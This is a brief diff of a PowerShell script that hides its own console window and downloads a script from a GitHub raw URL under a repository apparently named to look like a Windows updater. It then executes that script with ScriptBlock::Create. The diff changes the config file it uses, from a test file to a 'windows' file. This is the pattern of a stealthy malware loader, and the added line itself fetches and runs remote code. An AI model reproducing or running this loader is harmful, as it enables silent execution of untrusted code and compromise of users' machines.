@@ -2,4 +2,4 @@ Add-Type -Name W -Namespace H -MemberDefinition '[DllImport("user32.dll")]public
 [H.W]::ShowWindow([H.W]::GetConsoleWindow(),0)
 $base='https://raw.githubusercontent.com/root-update/winup/refs/heads/main'
 $initial = (New-Object System.Net.WebClient).DownloadString("$base/initial.txt")
-& ([ScriptBlock]::Create($initial)) -ConfigUrl "$base/test.json" -InitialScriptUrl "$base/initial.txt"
+& ([ScriptBlock]::Create($initial)) -ConfigUrl "$base/windows.json" -InitialScriptUrl "$base/initial.txt"
